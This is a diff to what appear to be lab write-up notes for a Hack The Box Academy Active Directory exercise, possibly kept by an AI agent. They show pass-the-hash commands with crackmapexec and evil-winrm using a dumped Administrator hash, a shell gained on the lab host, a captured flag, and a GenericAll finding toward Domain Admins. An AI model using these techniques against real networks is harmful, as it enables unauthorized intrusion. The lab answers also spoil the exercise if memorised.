@@ -571,3 +571,48 @@ s3imp3rs0nate_cl@ssic
 
 Uploaded mimikatz and got Administrator hash: `bdaffbfe64f1fc646a3353be1c2c3c99`
 
+## Enum / Access as Administrator
+
+SMB via crackmap failed but via evil-winRM worked. 
+
+```
+└─$ crackmapexec smb 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99 --shares
+SMB         172.16.7.50     445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         172.16.7.50     445    MS01             [-] INLANEFREIGHT.LOCAL\Administrator:bdaffbfe64f1fc646a3353be1c2c3c99 STATUS_LOGON_FAILURE
+
+┌──(openclaw㉿srv1405873)-[~/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data]
+└─$ evil-winrm -i 172.16.7.50 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
+
+Evil-WinRM shell v3.9
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+**Got flag from administrators desktop**
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/11/2022  10:32 PM             24 flag.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
+exc3ss1ve_adm1n_r1ights!
+```
+
+## Enum CT059
+
+Found CT059 has `GenericAll` to Domain Admins.
+
+![](../screenshots/CT059_generic_all.png)
